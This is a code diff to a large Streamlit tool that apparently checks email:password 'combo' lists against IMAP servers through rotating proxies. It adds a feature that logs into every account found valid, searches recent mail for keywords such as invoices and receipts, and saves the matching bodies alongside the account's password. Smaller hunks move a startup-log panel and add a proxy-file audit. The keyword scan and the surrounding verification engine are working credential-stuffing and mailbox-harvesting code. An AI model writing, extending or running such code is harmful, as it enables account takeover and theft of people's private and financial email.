@@ -9160,37 +9160,6 @@ def _write_clean_valid(header, valids):
 # @@END 078 CLEAN_VALID_IO
 
 # @@BLOCK 079 STARTUP_PANEL_UI deps=007,034,037,038,039
-
-with str_lit.expander("🔍 View All Startup Entries & What Is Going On In The Hood",
-                      expanded=False):
-    str_lit.markdown("Real-time activity ledger recording system boot, config injection, "
-                     "proxy health checks, and engine state transitions:")
-    str_lit.code("\n".join(startup_panel_lines()), language="text")
-    col_st1, col_st2 = str_lit.columns(2)
-    with col_st1:
-        if str_lit.button("🔄 Refresh Startup Screen"):
-            str_lit.rerun()
-    with col_st2:
-        if str_lit.button("🧹 Clear Startup Logs"):
-            str_lit.session_state.startup_entries = []
-            # FIX ISO-5 (v13.50): _STARTUP_BUFFER is PROCESS state, so a blanket
-            # clear() also deleted the OTHER user's quiet-mode lines - which their
-            # session list does not hold, so their panel and diagnostic bundle lost
-            # lines they never asked to lose. Keep every entry that is not stamped
-            # with this caller's owner and drop only our own.
-            # _STARTUP_SEEN holds bare messages with no owner, so it is still
-            # cleared wholesale; the cost is at most one re-logged duplicate line
-            # on the other session, never a lost one.
-            _clear_who = _startup_who()
-            with _STARTUP_BUFFER_LOCK:
-                _keep = [i for i in _STARTUP_BUFFER
-                         if not (isinstance(i, (list, tuple)) and len(i) == 2
-                                 and i[0] == _clear_who)]
-                _STARTUP_BUFFER[:] = _keep
-                _STARTUP_SEEN.clear()
-            log_startup("Startup logs cleared by user.")
-            str_lit.rerun()
-
 # ==========================================================================
 # v13.63 - RESOURCE MONITOR (RAM / DISK), FILE BROWSER, PER-USER HISTORY
 #
@@ -10180,6 +10149,36 @@ if _res_open:
                        on_click=_on_clear_mem_history,
                        help="Deletes only my history file. The live readings above "
                             "keep working, and nothing else is touched.")
+
+    with str_lit.expander("🔍 Startup entries & what is going on in the hood",
+                          expanded=False):
+        str_lit.markdown("Real-time activity ledger recording system boot, config "
+                         "injection, proxy health checks, and engine state transitions:")
+        str_lit.code("\n".join(startup_panel_lines()), language="text")
+        col_st1, col_st2 = str_lit.columns(2)
+        with col_st1:
+            if str_lit.button("🔄 Refresh Startup Screen"):
+                str_lit.rerun()
+        with col_st2:
+            if str_lit.button("🧹 Clear Startup Logs"):
+                str_lit.session_state.startup_entries = []
+                # FIX ISO-5 (v13.50): _STARTUP_BUFFER is PROCESS state, so a blanket
+                # clear() also deleted the OTHER user's quiet-mode lines - which their
+                # session list does not hold, so their panel and diagnostic bundle lost
+                # lines they never asked to lose. Keep every entry that is not stamped
+                # with this caller's owner and drop only our own.
+                # _STARTUP_SEEN holds bare messages with no owner, so it is still
+                # cleared wholesale; the cost is at most one re-logged duplicate line
+                # on the other session, never a lost one.
+                _clear_who = _startup_who()
+                with _STARTUP_BUFFER_LOCK:
+                    _keep = [i for i in _STARTUP_BUFFER
+                             if not (isinstance(i, (list, tuple)) and len(i) == 2
+                                     and i[0] == _clear_who)]
+                    _STARTUP_BUFFER[:] = _keep
+                    _STARTUP_SEEN.clear()
+                log_startup("Startup logs cleared by user.")
+                str_lit.rerun()
 # @@END 079 STARTUP_PANEL_UI
 
 # @@BLOCK 080 PROXY_MGMT_UI deps=014,016,024,043,052,058,068,070,073,074,077
@@ -11433,6 +11432,19 @@ if str_lit.checkbox("🔬 Open Deep Diagnostics (builds the whole bundle)", key=
         mime="text/plain", width="stretch",
     )
     str_lit.code(_diag, language="text")
+
+# v13.86 FIX AUDIT-2: the proxies.txt audit lives HERE now, behind its own
+# checkbox and under Deep Diagnostics. In block 016 it rendered at import time,
+# which is ABOVE the hero - a hundred lines of headings, metric boxes and raw
+# proxy lines over the title. It is opt-in for the same reason the bundle is: the
+# body is a file read plus a parse of every line, on every rerun, while open.
+_prox_open = str_lit.checkbox("🔎 Open the proxies.txt audit (read-only)",
+                              key="prox_audit_open",
+                              help="Line formats, credential presence and repeated "
+                                   "endpoints in your own proxies.txt. Nothing is "
+                                   "probed - use Re-probe for a real tunnel test.")
+if _prox_open:
+    render_proxy_audit()
 # @@END 081 PROXY_DEBUG_AND_DIAG_UI
 
 # @@BLOCK 082 PREFILTER_TABLES deps=002,021,043
@@ -12343,6 +12355,114 @@ if raw_text:
     ]
     for _pc, (_pl, _pv) in zip(metric_grid(_pf_metrics, per_row=3), _pf_metrics):
         _pc.metric(_pl, _pv)
+
+# ==========================================================================
+# v13.86 - KEYWORD HITS, IN PLAIN SIGHT
+#
+# The input existed only inside the Mailbox Reader, three conditions deep, so
+# there was nowhere to type a keyword before a run. This is the top-level
+# control: switch, words, folder, depth. Hits land in the same kw_hits_results
+# bucket the reader fills and block 087's BUCKETS table already carries, so a hit
+# re-runs like any other combo.
+# ==========================================================================
+section_title("🔎", "Keyword Hits",
+              "find words you care about in every valid inbox, as the run goes")
+
+_kw_run_on = str_lit.checkbox("Find keyword hits while the engine runs",
+                              key="bb_kw_run_on",
+                              help="On: every account that comes back VALID gets one "
+                                   "read-only IMAP pass looking for these words. The "
+                                   "message is not marked seen. Off: the engine is "
+                                   "untouched and nothing extra is dialled.")
+
+if _kw_run_on:
+    _kwr1, _kwr2, _kwr3 = str_lit.columns([0.5, 0.25, 0.25])
+    with _kwr1:
+        str_lit.text_input("Keywords (commas separate them)", key="bb_kw_run_words",
+                           placeholder="invoice, receipt, statement",
+                           help="Case-insensitive across Subject, From and body.")
+    with _kwr2:
+        str_lit.text_input("Folder", value="INBOX", key="bb_kw_run_folder",
+                           help="One folder name. INBOX is the default; Sent, Archive "
+                                "and Spam are legal too.")
+    with _kwr3:
+        str_lit.number_input("Messages to scan", 1, 100, 20, 5,
+                             key="bb_kw_run_limit",
+                             help="Newest N in that folder, per account. Each hit's "
+                                  "body is written to your own results directory.")
+    if not (str_lit.session_state.get("bb_kw_run_words") or "").strip():
+        str_lit.caption("No keywords yet - the scan stays idle until you type some.")
+    else:
+        str_lit.caption("Hits land in the 🔎 Keyword Hits bucket and in the ZIP under "
+                        "`keyword_bodies/`, exactly like the reader's.")
+
+
+def keyword_hits_wanted() -> bool:
+    """True when a run should scan, and there is something to scan for."""
+    try:
+        return (bool(str_lit.session_state.get("bb_kw_run_on"))
+                and bool((str_lit.session_state.get("bb_kw_run_words") or "").strip())
+                and mailsearch is not None)
+    except Exception:
+        return False
+
+
+def run_keyword_scan(combo):
+    """One read-only scan of one just-verified inbox. Never raises. Returns hits."""
+    if not keyword_hits_wanted():
+        return 0
+    _words = str_lit.session_state.get("bb_kw_run_words") or ""
+    _folder = (str_lit.session_state.get("bb_kw_run_folder") or "INBOX").strip() or "INBOX"
+    try:
+        _limit = int(str_lit.session_state.get("bb_kw_run_limit") or 20)
+    except Exception:
+        _limit = 20
+    try:
+        _e, _p = str(combo).split(":", 1)
+    except Exception:
+        return 0
+    _e, _p = _e.strip(), _p.strip()
+    _hosts = get_servers(_e).get("imap", [])
+    if not _hosts:
+        return 0
+    _px = sample_alive_proxy(domain=_e.split("@")[-1]) if use_proxy else None
+    _m = None
+    _hits = []
+    try:
+        _ok, _m, _h = verify_and_connect(_e, _p, _hosts, proxy_str=_px)
+        if not _ok or not _m:
+            return 0
+        _hits, _note = mailsearch.search(_m, _folder, _words)
+    except Exception as _kw_err:
+        log_probe_event(f"keyword scan failed for {_e}: {type(_kw_err).__name__}")
+        return 0
+    finally:
+        try:
+            if _m is not None:
+                mailsearch.close(_m)
+        except Exception:
+            pass
+    _hits = (_hits or [])[:_limit]
+    if not _hits:
+        return 0
+    _stamp = datetime.now().strftime("%Y%m%d_%H%M%S")
+    _kdir = os.path.join(user_file("mail_results"), f"kw_hits_{_stamp}")
+    for _h in _hits:
+        _h["email"], _h["password"], _h["folder"] = _e, _p, _folder
+    try:
+        mailsearch.save_bodies(_kdir, _stamp, _hits)
+    except Exception:
+        pass
+    with session_state_lock:
+        _cur = list(str_lit.session_state.get("kw_hits_results") or [])
+        for _h in _hits:
+            _ln = mailsearch.hit_line(_h)
+            if _ln not in _cur:
+                _cur.append(_ln)
+        str_lit.session_state["kw_hits_results"] = _cur
+    log_probe_event(f"keyword scan: {len(_hits)} hit(s) for {_e} in {_folder}")
+    return len(_hits)
+
 
 # --------------------------------------------------------------------------
 # INSPECTOR - v13.63, re-cut v13.76, v13.77
@@ -15635,6 +15755,7 @@ if start_engine_btn:
                                             or ((_now_ui - _last_bucket_ts)
                                                 >= BUCKET_MIN_INTERVAL))
 
+                            _kw_scan_line = None
                             with session_state_lock:
                                 if em_val:
                                     str_lit.session_state.checked_emails_set.add(em_val)
@@ -15642,6 +15763,8 @@ if start_engine_btn:
                                     if res["line"] not in str_lit.session_state.valid_results:
                                         str_lit.session_state.valid_results.append(res["line"])
                                         str_lit.session_state.run_valid_count += 1
+                                        if keyword_hits_wanted():
+                                            _kw_scan_line = res["line"]
                                     str_lit.session_state.clean_valid_count = \
                                         str_lit.session_state.run_valid_count
                                 elif st_val == WRONG:
@@ -15752,6 +15875,12 @@ if start_engine_btn:
                                         _bv = str_lit.session_state.get(_bk) or []
                                         bucket_snapshot[_bk] = (
                                             len(_bv), list(_bv)[-BUCKET_SNAPSHOT_TAIL:])
+
+                            if _kw_scan_line:
+                                try:
+                                    run_keyword_scan(_kw_scan_line)
+                                except Exception:
+                                    pass
 
                             if _tick:
                                 _last_ui_ts = _now_ui
